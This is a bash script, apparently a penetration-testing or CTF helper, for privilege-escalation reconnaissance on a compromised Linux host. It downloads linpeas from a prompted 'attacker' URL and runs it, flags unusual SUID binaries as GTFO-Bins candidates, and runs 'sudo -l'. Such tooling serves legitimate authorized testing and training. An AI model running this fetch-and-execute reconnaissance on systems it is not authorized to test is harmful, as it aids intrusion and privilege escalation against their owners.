#!/bin/bash

function RunLinPea {
    FILE=linpeas.sh

    if [ -f "$FILE" ]; then
        # file exists in tmp
        chmod +x $FILE
        ./$FILE > linpeas.out
        cat linpeas.out
    else
        # file doesnt exist in tmp
        read -p "Enter URL for Linpeas: [http://127.0.0.1:80/linpeas.sh]: " attackerURL
        
        # check for wget and curl and attempt download
        if which wget >/dev/null; then
            wget $attackerURL
            chmod +x linpeas.sh
            ./linpeas.sh > linpeas.out
        elif which curl >/dev/null; then
            curl $attackerURL --output /tmp/linpeas.sh
            chmod +x $FILE
            ./$FILE > linpeas.out
        else
            echo 'curl and wget do not exist!'
        fi
    fi
}

printf "

███████╗███╗   ██╗██╗   ██╗███╗   ███╗
██╔════╝████╗  ██║██║   ██║████╗ ████║
█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
                                      

"
# Ask to install linpeas.sh
read -p "Download Linpeas? [y/n]: " linpea
if [ "$linpea" == "y" ]; then
    RunLinPea
fi

# looks for things I can execute
read -p "Find GTFO-Bins? [y/n]: " gtfoSearch
if [ "$gtfoSearch" == "y" ]; then
    # List of default SUID Bins
    suidList=(
    "/bin/mount"
    "/bin/ping"
    "/bin/ping6"
    "/bin/su"
    "/bin/umount"
    "/sbin/mount.ecryptfs_private"
    "/usr/bin/at"
    "/usr/bin/bwrap"
    "/usr/bin/chfn"
    "/usr/bin/chsh"
    "/usr/bin/gpasswd"
    "/usr/bin/newgrp"
    "/usr/bin/passwd"
    "/usr/bin/pkexec"
    "/usr/bin/sudo"
    "/usr/bin/traceroute6.iputils"
    "/usr/lib/dbus-1.0/dbus-daemon-launch-helper"
    "/usr/lib/openssh/ssh-keysign"
    "/usr/lib/snapd/snap-confine"
    "/usr/lib/eject/dmcrypt-get-device"
    "/usr/lib/policykit-1/polkit-agent-helper-1"
    "/usr/lib/pt_chown"
    "/usr/sbin/exim4"
    "/usr/bin/mount"
    "/usr/bin/ping"
    "/usr/bin/ping6"
    "/usr/bin/su"
    "/usr/bin/umount"
    )

    # Find all SUID binaries on the system
    foundSUIDBins=$(find / -perm -u=s -type f 2>/dev/null)
    readarray -t suidBins <<< "$foundSUIDBins"

    # Total number of found SUID binaries
    total=${#suidBins[@]}
    count=0

    # Function to display a progress bar
    progress_bar() {
        local progress=$1
        local total=$2
        local width=50
        local percent=$((progress * 100 / total))
        local completed=$((width * progress / total))
        local remaining=$((width - completed))

        printf "\r["
        printf "%0.s#" $(seq 1 $completed)
        printf "%0.s-" $(seq 1 $remaining)
        printf "] %d%%" $percent
    }

    # Check SUID binaries against the predefined list
    for binary in "${suidBins[@]}"; do
        if ! [[ " ${suidList[*]} " == *" $binary "* ]]; then
            unlistedSUIDBins+=("$binary")  # Append to the array
        fi
        count=$((count + 1))
        progress_bar $count $total
    done

    # Move to a new line after the progress bar is done
    echo

    # Print the SUID binaries not in the predefined list
    echo "SUID binaries not in the predefined list:"
    for unlisted_binary in "${unlistedSUIDBins[@]}"; do
        echo "$unlisted_binary"
    done
    echo
fi

# Ask to check sudo l
read -p "Check sudo for vulns? [y/n]: " runSudo
if [ "$runSudo" == "y" ]; then
    sudo -l
fi

printf "

▓█████  ██▓         █████▒██▓ ███▄    █ 
▓█   ▀ ▓██▒       ▓██   ▒▓██▒ ██ ▀█   █ 
▒███   ▒██░       ▒████ ░▒██▒▓██  ▀█ ██▒
▒▓█  ▄ ▒██░       ░▓█▒  ░░██░▓██▒  ▐▌██▒
░▒████▒░██████▒   ░▒█░   ░██░▒██░   ▓██░
░░ ▒░ ░░ ▒░▓  ░    ▒ ░   ░▓  ░ ▒░   ▒ ▒ 
 ░ ░  ░░ ░ ▒  ░    ░      ▒ ░░ ░░   ░ ▒░
   ░     ░ ░       ░ ░    ▒ ░   ░   ░ ░ 
   ░  ░    ░  ░           ░           ░ 
                                        

"
